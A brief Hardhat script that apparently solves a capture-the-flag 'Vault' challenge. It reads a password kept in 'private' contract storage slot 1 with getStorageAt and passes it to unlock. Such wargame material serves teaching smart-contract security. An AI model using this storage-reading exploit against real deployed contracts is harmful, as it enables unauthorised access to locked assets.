import { ethers } from "hardhat";

const INSTANCE = "0xCe5A48ff12ddAc18cb82edE5e21dd1ff47CBE937";

async function main() {
  const password = await ethers.provider.getStorageAt(INSTANCE, 1);
  console.log(password);
  const vault = await ethers.getContractAt("Vault", INSTANCE);
  const tx = await vault.unlock(password);
  await tx.wait();
  console.log("successfully unlocked vault");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
